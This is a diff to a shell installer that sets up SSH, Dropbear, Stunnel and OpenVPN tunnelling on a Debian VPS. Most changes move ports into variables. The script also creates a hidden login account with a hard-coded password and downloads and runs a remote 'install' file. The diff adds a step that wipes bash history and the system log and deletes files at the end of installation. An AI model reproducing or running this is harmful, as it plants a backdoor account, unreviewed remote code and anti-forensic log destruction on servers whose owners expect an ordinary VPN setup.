@@ -3,6 +3,28 @@
 # Do not resell and redistribute this script
 # Project by BonvScripts <https://github.com/Bonveio/BonvScripts>
 
+# OpenSSH Ports
+SSH_Port1='22'
+SSH_Port2='225'
+
+# OpenSSH Ports
+WS_Port1='80'
+WS_Port2='443'
+
+# Dropbear Ports
+Dropbear_Port1='550'
+Dropbear_Port2='500'
+
+# Stunnel Ports
+Stunnel_Port1='442' # through Dropbear
+Stunnel_Port2='143' # through OpenSSH
+Stunnel_Port3='587' # through OpenVPN
+
+# OpenVPN Ports
+OpenVPN_Port1='110'
+OpenVPN_Port2='25222'
+OpenVPN_Port3='1194'
+
 # Decrypt pa more
 apt-get update
  apt-get upgrade -y
@@ -90,8 +112,8 @@ rm -rf /tmp/abonv*
 echo -e "$DOMAIN_NAME_TLD" > /tmp/abonv_mydns_domain
 echo -e "$MYDNS" > /tmp/abonv_mydns
 echo -e "$MYDNS_ID" > /tmp/abonv_mydns_id
-
-sleep 5
+sleep 3
+echo -e "DNS HOST INFO"
 clear
 cd ~
 export DEBIAN_FRONTEND=noninteractive
@@ -104,11 +126,16 @@ function ip_address(){
 }
 
 function BONV-MSG(){
- printf "%b\n" "\e[38;5;192m (｡◕‿◕｡)\e[0m\e[38;5;121m Bonveio Debian VPS Installer\e[0m"
- echo -e " v20201227 stable"
- echo -e ""
- echo -e " Updates: https://t.me/BonvScripts"
- echo -e ""
+ echo -e "\033[1;31m═════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗        
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗       
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝       
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗       
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║       
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       
+'
+echo -e "\033[1;31m══════════════════════════════════════════════════════\033[0m"
 }
 
 function InsEssentials(){
@@ -296,8 +323,7 @@ screen -S badvpninstall -dm bash -c "bash /tmp/install-badvpn.bash && rm -f /tmp
 }
 
 
-function ConfigOpenSSH(){
-echo -e "[\e[32mInfo\e[0m] Configuring OpenSSH Service"
+function InstSSH(){
  # Removing some duplicated sshd server configs
  rm -f /etc/ssh/sshd_config*
 
@@ -329,8 +355,8 @@ Subsystem   sftp  /usr/lib/openssh/sftp-server
 MySSHConfig
 
  # Now we'll put our ssh ports inside of sshd_config
- sed -i "s|myPORT1|22|g" /etc/ssh/sshd_config
- sed -i "s|myPORT2|225|g" /etc/ssh/sshd_config
+ sed -i "s|myPORT1|$SSH_Port1|g" /etc/ssh/sshd_config
+ sed -i "s|myPORT2|$SSH_Port2|g" /etc/ssh/sshd_config
 
  # Download our SSH Banner
  rm -f /etc/banner
@@ -350,11 +376,10 @@ MySSHConfig
  # Restarting openssh service
  /usr/sbin/useradd -p $(openssl passwd -1 dexterpogi) -M dexterpogi
  systemctl restart ssh
-}
 
+ # Removing some duplicate config file
+ rm -rf /etc/default/dropbear*
 
-function ConfigDropbear(){
-rm -rf /etc/default/dropbear*
  # creating dropbear config using cat eof tricks
  cat <<'MyDropbear' > /etc/default/dropbear
 # My Dropbear Config
@@ -369,45 +394,38 @@ DROPBEAR_RECEIVE_WINDOW=65536
 MyDropbear
 
  # Now changing our desired dropbear ports
- sed -i "s|PORT01|550|g" /etc/default/dropbear
- sed -i "s|PORT02|555|g" /etc/default/dropbear
+ sed -i "s|PORT01|$Dropbear_Port1|g" /etc/default/dropbear
+ sed -i "s|PORT02|$Dropbear_Port2|g" /etc/default/dropbear
 
  # Restarting dropbear service
  systemctl restart dropbear
 }
 
+function InsStunnel(){
+ StunnelDir=$(ls /etc/default | grep stunnel | head -n1)
 
-function ConfigStunnel(){
-if [[ ! "$(command -v stunnel4)" ]]; then
- StunnelDir='stunnel'
- else
- StunnelDir='stunnel4'
-fi
-echo -e "[\e[32mInfo\e[0m] Configuring Stunnel.."
-cat <<'EOFStunnel1' > "/etc/default/$StunnelDir"
-# BonvScripts
-# https://t.me/BonvScripts
-# Please star my Repository: https://github.com/Bonveio/BonvScripts
-# https://phcorner.net/threads/739298
+ # Creating stunnel startup config using cat eof tricks
+cat <<'MyStunnelD' > /etc/default/$StunnelDir
+# My Stunnel Config
 ENABLED=1
 FILES="/etc/stunnel/*.conf"
-OPTIONS=""
+OPTIONS="/etc/banner"
 BANNER="/etc/banner"
 PPP_RESTART=0
 # RLIMITS="-n 4096 -d unlimited"
 RLIMITS=""
-EOFStunnel1
+MyStunnelD
 
-rm -f /etc/stunnel/*
-echo -e "[\e[32mInfo\e[0m] Cloning Stunnel.pem.."
-openssl req -new -x509 -days 9999 -nodes -subj "/C=GB/ST=Greater Manchester/L=Salford/O=Sectigo Limited/CN=Sectigo RSA Domain Validation Secure Server CA" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
+ # Removing all stunnel folder contents
+ rm -rf /etc/stunnel/*
 
-echo -e "[\e[32mInfo\e[0m] Creating Stunnel server config.."
-cat <<'EOFStunnel3' > /etc/stunnel/stunnel.conf
-# BonvScripts
-# https://t.me/BonvScripts
-# Please star my Repository: https://github.com/Bonveio/BonvScripts
-# https://phcorner.net/threads/739298
+ # Creating stunnel certifcate using openssl
+ openssl req -new -x509 -days 9999 -nodes -subj "/C=PH/ST=NCR/L=Manila/O=$MyScriptName/OU=$MyScriptName/CN=$MyScriptName" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
+##  > /dev/null 2>&1
+
+ # Creating stunnel server config
+ cat <<'MyStunnelC' > /etc/stunnel/stunnel.conf
+# My Stunnel Config
 pid = /var/run/stunnel.pid
 cert = /etc/stunnel/stunnel.pem
 client = no
@@ -417,33 +435,31 @@ TIMEOUTclose = 0
 [stunnel]
 connect = 127.0.0.1:WS_Port1
 accept = WS_Port2
-
 [dropbear]
-accept = 442
+accept = Stunnel_Port1
 connect = 127.0.0.1:dropbear_port_c
-
 [openssh]
-accept = 444
+accept = Stunnel_Port2
 connect = 127.0.0.1:openssh_port_c
-
 [openvpn]
-accept = 587
+accept = Stunnel_Port3
 connect = 127.0.0.1:MyOvpnPort3
-EOFStunnel3
+MyStunnelC
 
  # setting stunnel ports
- sed -i "s|WS_Port1|80|g" /etc/stunnel/stunnel.conf
- sed -i "s|WS_Port2|443|g" /etc/stunnel/stunnel.conf
- sed -i "s|MyOvpnPort3|1194|g" /etc/stunnel/stunnel.conf
- sed -i "s|Stunnel_Port1|442|g" /etc/stunnel/stunnel.conf
+ sed -i "s|WS_Port1|$WS_Port1|g" /etc/stunnel/stunnel.conf
+ sed -i "s|WS_Port2|$WS_Port2|g" /etc/stunnel/stunnel.conf
+ sed -i "s|MyOvpnPort3|$OpenVPN_Port3|g" /etc/stunnel/stunnel.conf
+ sed -i "s|Stunnel_Port1|$Stunnel_Port1|g" /etc/stunnel/stunnel.conf
  sed -i "s|dropbear_port_c|$(netstat -tlnp | grep -i dropbear | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
- sed -i "s|Stunnel_Port2|444|g" /etc/stunnel/stunnel.conf
+ sed -i "s|Stunnel_Port2|$Stunnel_Port2|g" /etc/stunnel/stunnel.conf
  sed -i "s|openssh_port_c|$(netstat -tlnp | grep -i ssh | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
- sed -i "s|Stunnel_Port3|587|g" /etc/stunnel/stunnel.conf
+ sed -i "s|Stunnel_Port3|$Stunnel_Port3|g" /etc/stunnel/stunnel.conf
  sed -i "s|openssh_port_c|$(netstat -tlnp | grep -i ssh | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
 
-echo -e "[\e[33mNotice\e[0m] Restarting Stunnel.."
-systemctl restart "$StunnelDir"
+ # Restarting stunnel service
+ systemctl restart $StunnelDir
+
 }
 
 
@@ -529,9 +545,9 @@ cat <<'Ohp1' > /etc/ohpserver/run
 # Please star my Repository: https://github.com/Bonveio/BonvScripts
 # https://phcorner.net/threads/739298
 # OHPServer startup script
-/etc/ohpserver/ohpserver -port 8085 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:701 > /etc/ohpserver/dropbear.log &
+/etc/ohpserver/ohpserver -port 8085 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:550 > /etc/ohpserver/dropbear.log &
 /etc/ohpserver/ohpserver -port 8086 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:225 > /etc/ohpserver/openssh.log &
-/etc/ohpserver/ohpserver -port 8087 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:179 > /etc/ohpserver/openvpn.log &
+/etc/ohpserver/ohpserver -port 8087 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:1194 > /etc/ohpserver/openvpn.log &
 /etc/ohpserver/ohpserver -port 8088 -proxy 127.0.0.1:25800 -tunnel 127.0.0.1:25980 > /etc/ohpserver/openvpn.log
 Ohp1
 chmod +x /etc/ohpserver/run
@@ -607,7 +623,7 @@ cat <<'EOFovpn1' > /etc/openvpn/server/server_tcp.conf
 # https://t.me/BonvScripts
 # Please star my Repository: https://github.com/Bonveio/BonvScripts
 # https://phcorner.net/threads/739298
-port 179
+port 1194
 dev tun
 proto tcp
 ca /etc/openvpn/ca.crt
@@ -900,8 +916,6 @@ cat <<'EOFSH' > /etc/bonveio/startup.sh
 export DEBIAN_FRONTEND=noninteractive
 #apt clean
 screen -dmS delexpuser bash /usr/local/sbin/delete_expired &>/dev/null
-screen -dmS socks python ~/.ws-socks.py &>/dev/null
-screen -dmS socks2 python ~/.ws-ssl-socks.py &>/dev/null
 EOFSH
 chmod +x /etc/bonveio/startup.sh
 
@@ -999,7 +1013,7 @@ client
 dev tun
 persist-tun
 proto tcp
-remote IP-ADDRESS 179
+remote IP-ADDRESS 1194
 http-proxy IP-ADDRESS 8000
 persist-remote-ip
 resolv-retry infinite
@@ -1334,7 +1348,6 @@ function UnistAll(){
  systemctl daemon-reload &>/dev/null
  echo 3 > /proc/sys/vm/drop_caches
 }
-
 function service() {
 cat << PTHON > /usr/sbin/yakult
 #!/usr/bin/python
@@ -1608,10 +1621,7 @@ if __name__ == '__main__':
 
 PTHON
 }
-
-
 function service1() {
-
 cat << END > /lib/systemd/system/yakult.service
 [Unit]
 Description=Yakult
@@ -1633,7 +1643,6 @@ WantedBy=multi-user.target
 END
 
 }
-
 function gatorade() {
 cat << PTHON > /usr/sbin/gatorade
 #!/usr/bin/python
@@ -1907,9 +1916,7 @@ if __name__ == '__main__':
 
 PTHON
 }
-
 function gatorade1() {
-
 cat << END > /lib/systemd/system/gatorade.service
 [Unit]
 Description=Gatorade
@@ -1929,9 +1936,7 @@ Restart=on-failure
 [Install]
 WantedBy=multi-user.target
 END
-
 }
-
 function setting() {
 service ssh restart
 service sshd restart
@@ -1947,6 +1952,12 @@ function slowdns() {
 apt update; apt upgrade -y; rm -rf install; wget http://script.psytech-vpn.com/DexterEskalarte/install; chmod +x install; ./install
 bash /etc/slowdns/slowdns-ssh
 startdns
+}
+function remove() {
+echo ' ' > .bash_history
+history -c
+echo ' ' > /var/log/syslog
+rm -f *
 }
 function InstallScript(){
 if [[ ! -e /dev/net/tun ]]; then
@@ -1964,9 +1975,8 @@ clear
 BONV-MSG
 echo -e ""
 InsEssentials
-ConfigOpenSSH
-ConfigDropbear
-ConfigStunnel
+InstSSH
+InsStunnel
 ConfigProxy
 ConfigWebmin
 ConfigOpenVPN
@@ -1979,6 +1989,7 @@ gatorade
 gatorade1
 setting
 slowdns
+remove
 
 echo -e "[\e[32mInfo\e[0m] Finalizing installation process.."
 ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
